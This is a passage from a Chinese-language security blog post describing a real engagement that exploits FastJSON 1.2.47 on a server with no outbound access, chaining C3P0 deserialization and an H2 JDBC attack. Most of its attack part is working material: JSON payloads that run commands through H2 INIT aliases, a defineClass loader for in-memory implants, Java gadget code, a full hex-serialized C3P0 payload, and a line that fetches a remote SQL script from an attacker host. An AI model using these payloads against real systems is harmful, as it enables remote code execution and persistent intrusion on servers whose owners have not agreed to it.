80i$aa$be$922$d2$97$db$f7$60$3fQ$u$X$ef$Q$9d$df$92S$40$i$7c$U$e9$3d$8b$I$f3$98A$Z$_$a8$w$3d$rHgF$g$9c$Jb$e6$88$vc$81$ba$8b$a3$fc$d2$l$aa$ee$90$ebu$C$A$A&quot;&#125;&#125;:&quot;x&quot;&#125;&#125;,</span><br><span class="line">&#125;&#125;,</span><br><span class="line">&quot;username&quot;:&quot;a&quot;,&quot;password&quot;:&quot;b&quot;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2、FastJSON-Attack-H2-JDBC-Driver"><a href="#2、FastJSON-Attack-H2-JDBC-Driver" class="headerlink" title="2、FastJSON Attack H2 JDBC Driver"></a>2、FastJSON Attack H2 JDBC Driver</h2><p>目标使用了一套通用的系统，在分析该系统时发现使用了fastjson1.2.47漏洞版本也找到了使用FastJSON解析的接口。但也因为目标无法出网的问题导致无法利用，观察lib列表发现了多个漏洞利用常用包。</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2022/11/12/16682385104732.jpg"></p>
<p>观察这些Jar包，能想到一个很简单的思路，借助C3P0的二次反序列化，虽然Commons-Collections-3.2.2、Commons-Collections4-4.1都是无漏洞版本，但是还有Commons-Beanutils，那么最终的利用就是 Fastjson -&gt; C3P0 -&gt; CommonsBeanutils。</p>
<p>首先大概了解一下C3P0的二次反序列化，<br>com.mchange.v2.c3p0.WrapperConnectionPoolDataSource#WrapperConnectionPoolDataSource</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">WrapperConnectionPoolDataSource</span><span class="params">(<span class="keyword">boolean</span> autoregister)</span></span>&#123;</span><br><span class="line">  <span class="keyword">super</span>(autoregister);</span><br><span class="line">  <span class="keyword">this</span>.connectionTester =   C3P0Registry.getDefaultConnectionTester();  </span><br><span class="line">  <span class="keyword">this</span>.setUpPropertyListeners(); <span class="comment">// 设置属性监听器</span></span><br></pre></td></tr></table></figure>

<p>在构造方法中，开启了一个属性的监听器</p>
<p>com.mchange.v2.c3p0.impl.WrapperConnectionPoolDataSourceBase#setUserOverridesAsString</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">setUserOverridesAsString</span><span class="params">(String userOverridesAsString)</span> <span class="keyword">throws</span> PropertyVetoException </span>&#123; </span><br><span class="line">        String oldVal = <span class="keyword">this</span>.userOverridesAsString; </span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.eqOrBothNull(oldVal, userOverridesAsString))&#123; </span><br><span class="line">                <span class="keyword">this</span>.vcs.fireVetoableChange(<span class="string">&quot;userOverridesAsString&quot;</span>, oldVal, userOverridesAsString); </span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>在setter方法中，如果修改了userOverridesAsString属性值就会触发监听器</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setUpPropertyListeners</span><span class="params">()</span> </span>&#123; </span><br><span class="line">...................... </span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;userOverridesAsString&quot;</span>.equals(propName)) &#123; </span><br><span class="line">  <span class="keyword">try</span> &#123; </span><br><span class="line">      WrapperConnectionPoolDataSource.<span class="keyword">this</span>.userOverrides = C3P0ImplUtils.parseUserOverridesAsString((String)val); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在监听器方法中，如果修改的是userOverridesAsString属性，就会调用到C3P0ImplUtils.parseUserOverridesAsString方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">parseUserOverridesAsString</span><span class="params">(String userOverridesAsString)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (userOverridesAsString != <span class="keyword">null</span>) &#123; </span><br><span class="line">                String hexAscii = userOverridesAsString.substring(<span class="string">&quot;HexAsciiSerializedMap&quot;</span>.length() + <span class="number">1</span>, userOverridesAsString.length() - <span class="number">1</span>); </span><br><span class="line">                <span class="keyword">byte</span>[] serBytes = ByteUtils.fromHexAscii(hexAscii); </span><br><span class="line">                <span class="keyword">return</span> Collections.unmodifiableMap((Map)SerializableUtils.fromByteArray(serBytes)); </span><br></pre></td></tr></table></figure>

<p>在该方法中，对userOverridesAsString属性值Hex解码后进行了Java原生反序列化。<br>那么在FastJSON反序列化时，如果classpath下存在C3P0以及一些不需要出网的Gadget（例如Commons-Collections、Commons-Beanutils)就可以实现不出网RCE。<br>由于Java反序列化中C3P0 Gadget是需要出网去加载class的（以前发过&lt;&lt;JAVA反序列化之C3P0不出网利用&gt;&gt;在Tomcat环境下C3P0可以实现不出网利用，目标环境不支持），所以没法在目标环境下利用，只能选择使用beanutils。</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2022/11/12/16682385516142.jpg"></p>
<p>最后在利用时一直无法利用成功，发现目标的beanutils是commons-beanutils-core，对比commons-beanutils有差异，core不存在反序列化时最重要的一个类org.apache.commons.beanutils.BeanComparator，导致一直无法利用成功。</p>
<p>在这条链路断掉后，又只能去寻找其他的利用链。观察classpath发现还存在h2的包。在近两年Java安全中很常用的技术 JDBC Attack，它主要的触发方式就是通过getConnection连接恶意服务或者设置恶意参数实现RCE，getConnection方法也符合getter格式，众所周知FastJSON可以调用getter方法，那么可能可以通过FastJSON调用H2的getConnection实现RCE。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">org.h2.jdbcx.JdbcDataSource#getConnection</span><br><span class="line"><span class="function"><span class="keyword">public</span> Connection <span class="title">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123; </span><br><span class="line">        <span class="keyword">this</span>.debugCodeCall(“getConnection”); </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getJdbcConnection(<span class="keyword">this</span>.userName,StringUtils.cloneCharArray(<span class="keyword">this</span>.passwordChars)); <span class="comment">//调用getJdbcConnection </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过反序列控制url属性后connect触发JDBC Attack</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> JdbcConnection <span class="title">getJdbcConnection</span><span class="params">(String var1, <span class="keyword">char</span>[] var2)</span> <span class="keyword">throws</span> SQLException </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.isDebugEnabled())&#123; </span><br><span class="line">                <span class="keyword">this</span>.debugCode(<span class="string">&quot;getJdbcConnection(&quot;</span> + quote(var1) + <span class="string">&quot;, new char[0]);&quot;</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        Properties var3 = <span class="keyword">new</span> Properties(); </span><br><span class="line">        var3.setProperty(<span class="string">&quot;user&quot;</span>, var1); </span><br><span class="line">        var3.put(<span class="string">&quot;password&quot;</span>, var2); </span><br><span class="line">        Connection var4 = Driver.load().connect(<span class="keyword">this</span>.url, var3);</span><br></pre></td></tr></table></figure>

<p>能够触发H2 JDBC Attack后，就需要研究如何不出网RCE了，H2常用的RCE姿势<br>1、RUNSCRIPT 加载远程SQL文件，（利用需出网）<br>jdbc:h2:mem:testdb; INIT=RUNSCRIPT FROM ‘<a target="_blank" rel="noopener" href="http://vps/poc.sql&#39;">http://VPS/poc.sql&#39;</a><br>2、Trigger 编译执行Javascript , &lt;<Make JDBC Attacks Brilliant Again>&gt;，（仅支持&gt;=1.4.197版本)<br>jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER hhhh BEFORE SELECT ON INFORMATION_SCHEMA.CATALOGS AS ‘//javascript<br>java.lang.Runtime.getRuntime().exec(“open -a Calculator.app”)’</p>
<p>两种方式都不适合我们的环境，其中RUNSCRIPT的实现方式为 加载远程的SQL文件到本地运行实现RCE，远程的SQL文件内容为创建代码执行方法然后调用执行。<br>为什么需要RUNSCRIPT?  按照网上的说法是，<br>1、H2 RCE分为两个步骤，需要先创建代码执行方法，再通过EXEC执行该方法<br>2、H2 init所使用的session.prepareCommand不支持执行多条SQL语句</p>
<p>那么prepareCommand真的不支持执行多条SQL语句吗?</p>
<p>org.h2.engine.session#prepareCommand -&gt; org.h2.engine.session#prepareLocal -&gt; org.h2.command.Parser#prepareCommand</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Command <span class="title">prepareCommand</span><span class="params">(String var1)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">try</span> &#123; </span><br><span class="line">                Prepared var2 = <span class="keyword">this</span>.parse(var1); </span><br><span class="line">                <span class="keyword">boolean</span> var3 = <span class="keyword">this</span>.isToken(<span class="string">&quot;;&quot;</span>); </span><br><span class="line">                <span class="keyword">if</span> (!var3 &amp;&amp; <span class="keyword">this</span>.currentTokenType != <span class="number">11</span>) &#123; </span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">this</span>.getSyntaxError(); </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">                        var2.prepare(); </span><br><span class="line">                        Object var4 = <span class="keyword">new</span> CommandContainer(<span class="keyword">this</span>, var1, var2); </span><br><span class="line">                        <span class="keyword">if</span> (var3) &#123; </span><br><span class="line">                                String var5 = <span class="keyword">this</span>.originalSQL.substring(<span class="keyword">this</span>.parseIndex);  <span class="comment">//获取未执行的SQL语句 </span></span><br><span class="line">                                <span class="keyword">if</span> (var5.trim().length() != <span class="number">0</span>) &#123; </span><br><span class="line">                                        var4 = <span class="keyword">new</span> CommandList(<span class="keyword">this</span>, var1, (Command)var4, var5); &#125; &#125; </span><br><span class="line">                                        <span class="keyword">return</span> (Command)var4; </span><br><span class="line">                                 &#125; </span><br><span class="line">                         &#125; </span><br><span class="line">        <span class="keyword">catch</span> (DbException var6) &#123; </span><br><span class="line">            <span class="keyword">throw</span> var6.addSQL(<span class="keyword">this</span>.originalSQL); </span><br><span class="line">        &#125; </span><br><span class="line">        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在H2解析SQL语句的时候，很明显会先解析第一条SQL语句并将剩余的SQL语句保存到remaining属性中，解析结果如图所示</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2022/11/12/16682385892390.jpg"></p>
<p>prepareCommand最终执行SQL时调用update方法，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">update</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">int</span> var1 = <span class="keyword">this</span>.command.executeUpdate(<span class="keyword">false</span>).getUpdateCount();               <span class="keyword">this</span>.executeRemaining(); </span><br><span class="line">        <span class="keyword">return</span> var1; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着会调用executeRemaining方法，执行剩余的SQL语句，看这个逻辑肯定是支持执行多条语句的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">executeRemaining</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        Command var1 = <span class="keyword">this</span>.session.prepareLocal(<span class="keyword">this</span>.remaining);         </span><br><span class="line">        <span class="keyword">if</span> (var1.isQuery()) &#123; </span><br><span class="line">                var1.query(<span class="number">0</span>); </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">                var1.update(); </span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>至于网上为什么说为什么不支持执行多条SQL语句，我猜会不会是忘记转义了分号?</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:h2:mem:test;MODE&#x3D;MSSQLServer;INIT&#x3D;CREATE ALIAS if not exists EXEC AS &#39;void exec(String cmd) throws java.io.IOException &#123;Runtime.getRuntime().exec(cmd);&#125;&#39;;CALL EXEC (&#39;open -a calculator.app&#39;);</span><br></pre></td></tr></table></figure>

<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2022/11/12/16682386153554.jpg"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:h2:mem:test;MODE&#x3D;MSSQLServer;INIT&#x3D;CREATE ALIAS if not exists EXEC AS &#39;void exec(String cmd) throws java.io.IOException &#123;Runtime.getRuntime().exec(cmd)\;&#125;&#39;\;CALL EXEC (&#39;open -a calculator.app&#39;)\;</span><br></pre></td></tr></table></figure>

<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2022/11/12/16682386153554.jpg"></p>
<p>最后FastJSON 1.2.47利用，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;org.h2.jdbcx.JdbcDataSource&quot;&#125;,&#123;&quot;@type&quot;:&quot;org.h2.jdbcx.JdbcDataSource&quot;, &quot;url&quot;:&quot;jdbc:h2:mem:test;MODE&#x3D;MSSQLServer;INIT&#x3D;drop alias if exists exec\\;CREATE ALIAS EXEC AS &#39;void exec() throws java.io.IOException &#123; Runtime.getRuntime().exec(\&quot;open -a calculator.app\&quot;)\\; &#125;&#39;\\;CALL EXEC ()\\;&quot;&#125;,&#123;&quot;$ref&quot;:&quot;$[1].connection&quot;&#125;]</span><br></pre></td></tr></table></figure>

<p>通过defineClass执行代码中马，因为不涉及到上面的$ref引用值，利用JSONObject的toString调用getter也行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;org.h2.jdbcx.JdbcDataSource&quot;&#125;,&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,&quot;c&quot;:&#123;&quot;@type&quot;:&quot;org.h2.jdbcx.JdbcDataSource&quot;, &quot;url&quot;:&quot;jdbc:h2:mem:test;MODE&#x3D;MSSQLServer;INIT&#x3D;drop alias if exists exec\\;CREATE ALIAS EXEC AS &#39;void exec() throws java.io.IOException &#123; try &#123; byte[] b &#x3D; java.util.Base64.getDecoder().decode(\&quot;byteCodes\&quot;)\\; java.lang.reflect.Method method &#x3D; ClassLoader.class.getDeclaredMethod(\&quot;defineClass\&quot;, byte[].class, int.class, int.class)\\; method.setAccessible(true)\\; Class c &#x3D; (Class) method.invoke(Thread.currentThread().getContextClassLoader(), b, 0, b.length)\\; c.newInstance()\\; &#125; catch (Exception e)&#123; &#125;&#125;&#39;\\;CALL EXEC ()\\;&quot;&#125;&#125;:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;org.h2.jdbcx.JdbcDataSource&quot;&#125;,&#123;&quot;@type&quot;:&quot;org.h2.jdbcx.JdbcDataSource&quot;, &quot;url&quot;:&quot;jdbc:h2:mem:test;MODE&#x3D;MSSQLServer;INIT&#x3D;drop alias if exists exec\\;CREATE ALIAS EXEC AS &#39;void exec() throws java.io.IOException &#123; try &#123; byte[] b &#x3D; java.util.Base64.getDecoder().decode(\&quot;byteCodes\&quot;)\\; java.lang.reflect.Method method &#x3D; ClassLoader.class.getDeclaredMethod(\&quot;defineClass\&quot;, byte[].class, int.class, int.class)\\; method.setAccessible(true)\\; Class c &#x3D; (Class) method.invoke(Thread.currentThread().getContextClassLoader(), b, 0, b.length)\\; c.newInstance()\\; &#125; catch (Exception e)&#123; &#125;&#125;&#39;\\;CALL EXEC ()\\;&quot;&#125;,&#123;&quot;$ref&quot;:&quot;$[1].connection&quot;&#125;]</span><br></pre></td></tr></table></figure>

<p>后期在项目复盘时才想到，因为是低版本的FastJSON，直接使用C3P0反序列化来打FastJSON就行了。</p>
<p>com.alibaba.fastjson.JSON#toString</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.toJSONString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在toJSONString，会进行JSON序列化进而调用到getter方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toJSONString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    SerializeWriter out = <span class="keyword">new</span> SerializeWriter();</span><br><span class="line"></span><br><span class="line">    String var2;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        (<span class="keyword">new</span> JSONSerializer(out)).write(<span class="keyword">this</span>);</span><br><span class="line">        var2 = out.toString();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过BadAttributeValueExpException就能调用到com.alibaba.fastjson.JSON#toString方法，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> alibaba.payloads.util.Reflections;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> alibaba.payloads.util.Gadgets;</span><br><span class="line"><span class="keyword">import</span> alibaba.payloads.util.PayloadRunner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FastJSON</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field valfield = val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        Reflections.setAccessible(valfield);</span><br><span class="line">        ArrayList arrayList = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        arrayList.add(Gadgets.createTemplatesImpl(command));</span><br><span class="line">        JSONArray jsonArray = <span class="keyword">new</span> JSONArray(arrayList);</span><br><span class="line">        valfield.set(val, jsonArray);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        PayloadRunner.run(FastJSON.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后利用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;&#125;,&quot;b&quot;:&#123;&quot;@type&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,&quot;userOverridesAsString&quot;:&quot;HexAsciiSerializedMap:ACED00057372002E6A617661782E6D616E6167656D656E742E42616441747472696275746556616C7565457870457863657074696F6ED4E7DAAB632D46400200014C000376616C7400124C6A6176612F6C616E672F4F626A6563743B787200136A6176612E6C616E672E457863657074696F6ED0FD1F3E1A3B1CC4020000787200136A6176612E6C616E672E5468726F7761626C65D5C635273977B8CB0300044C000563617573657400154C6A6176612F6C616E672F5468726F7761626C653B4C000D64657461696C4D6573736167657400124C6A6176612F6C616E672F537472696E673B5B000A737461636B547261636574001E5B4C6A6176612F6C616E672F537461636B5472616365456C656D656E743B4C001473757070726573736564457863657074696F6E737400104C6A6176612F7574696C2F4C6973743B787071007E0008707572001E5B4C6A6176612E6C616E672E537461636B5472616365456C656D656E743B02462A3C3CFD22390200007870000000027372001B6A6176612E6C616E672E537461636B5472616365456C656D656E746109C59A2636DD8502000449000A6C696E654E756D6265724C000E6465636C6172696E67436C61737371007E00054C000866696C654E616D6571007E00054C000A6D6574686F644E616D6571007E0005787000000011740019616C69626162612E7061796C6F6164732E466173744A534F4E74000D466173744A534F4E2E6A6176617400096765744F626A6563747371007E000B00000022740017616C69626162612E47656E65726174655061796C6F616474001447656E65726174655061796C6F61642E6A6176617400046D61696E737200266A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F6469666961626C654C697374FC0F2531B5EC8E100200014C00046C69737471007E00077872002C6A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F6469666961626C65436F6C6C656374696F6E19420080CB5EF71E0200014C0001637400164C6A6176612F7574696C2F436F6C6C656374696F6E3B7870737200136A6176612E7574696C2E41727261794C6973747881D21D99C7619D03000149000473697A657870000000007704000000007871007E0019787372001E636F6D2E616C69626162612E666173746A736F6E2E4A534F4E417272617900000000000000010200024C00046C69737471007E00074C000C72656C61746564417272617971007E000178707371007E0018000000017704000000017372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C6173737400125B4C6A6176612F6C616E672F436C6173733B4C00055F6E616D6571007E00054C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B78700000000000000000757200035B5B424BFD19156767DB37020000787000000002757200025B42ACF317F8060854E0020000787000000313CAFEBABE0000003100270A0003000F0700220700120100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010013537475625472616E736C65745061796C6F616401000C496E6E6572436C61737365730100334C616C69626162612F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F61643B01000A536F7572636546696C6501000C476164676574732E6A6176610C00040005070013010031616C69626162612F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F61640100106A6176612F6C616E672F4F626A65637401001D616C69626162612F7061796C6F6164732F7574696C2F476164676574730100083C636C696E69743E0100116A6176612F6C616E672F52756E74696D6507001501000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B0C001700180A001600190100166F70656E202D612063616C63756C61746F722E61707008001B01000465786563010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0C001D001E0A0016001F01000D537461636B4D61705461626C6501001A616C69626162612F636F6D32353638363432373636303332303901001C4C616C69626162612F636F6D3235363836343237363630333230393B010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740700240A0025000F002100020025000000000002000100040005000100060000002F00010001000000052AB70026B10000000200070000000600010000003700080000000C0001000000050009002300000008001400050001000600000024000300020000000FA70003014CB8001A121CB6002057B1000000010021000000030001030002000D00000002000E000B0000000A000100020010000A00097571007E0024000001CECAFEBABE00000034001B0A0003001507001707001807001901001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C75650571E669EE3C6D47180100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010003466F6F01000C496E6E6572436C61737365730100234C616C69626162612F7061796C6F6164732F7574696C2F4761646765747324466F6F3B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07001A010021616C69626162612F7061796C6F6164732F7574696C2F4761646765747324466F6F0100106A6176612F6C616E672F4F626A6563740100146A6176612F696F2F53657269616C697A61626C6501001D616C69626162612F7061796C6F6164732F7574696C2F47616467657473002100020003000100040001001A000500060001000700000002000800010001000A000B0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000003A000E0000000C000100000005000F001200000002001300000002001400110000000A000100020016001000097074000450776E7270770100787870;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2022/11/12/16682386652889.jpg"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>1.<a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/120275526">https://blog.csdn.net/solitudi/article/details/120275526</a><br>2.<a target="_blank" rel="noopener" href="https://www.ctfiot.com/17904.html">https://www.ctfiot.com/17904.html</a><br>3.<a target="_blank" rel="noopener" href="https://conference.hitb.org/files/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&amp;%20Chen%20Hongkun.pdf">https://conference.hitb.org/files/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&amp;%20Chen%20Hongkun.pdf</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Java/">Java</a>
    </span>
    

    </div>

    
  </div>
</article>

  






    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2024 雨了个雨
    
  </p>
</footer>
    
    
  </div>
</div>
</body>
</html>